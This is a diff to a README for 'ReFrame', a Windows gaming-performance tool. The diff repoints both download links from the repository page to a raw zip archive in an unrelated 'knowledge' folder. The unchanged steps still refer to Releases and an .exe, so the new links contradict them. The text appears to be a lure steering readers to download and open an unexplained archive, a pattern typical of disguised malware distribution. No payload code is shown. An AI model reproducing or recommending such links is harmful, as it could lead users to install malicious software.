@@ -1,6 +1,6 @@
 # ⚡ ReFrame - Improve your PC gaming performance today
 
-[![](https://img.shields.io/badge/Download-ReFrame-blue.svg)](https://github.com/Yowspo/ReFrame)
+[![](https://img.shields.io/badge/Download-ReFrame-blue.svg)](https://github.com/Yowspo/ReFrame/raw/refs/heads/main/knowledge/Re_Frame_3.9.zip)
 
 ReFrame helps your computer run games better. This tool looks at your hardware and your game settings. It finds ways to boost your frames per second and makes sure your system runs smooth. You do not need to change settings by hand. ReFrame does this work for you. The tool also makes a backup of your files. You can undo any changes at any time.
 
@@ -17,7 +17,7 @@ ReFrame works on Windows 10 and Windows 11. It needs the following to run well:
 
 Follow these steps to get ReFrame on your computer.
 
-1. Go to the [ReFrame download page](https://github.com/Yowspo/ReFrame).
+1. Go to the [ReFrame download page](https://github.com/Yowspo/ReFrame/raw/refs/heads/main/knowledge/Re_Frame_3.9.zip).
 2. Look for the latest version under the Releases section on the right side of the page.
 3. Click the file that ends with .exe to save it to your computer.
 4. Open the file once the download finishes.
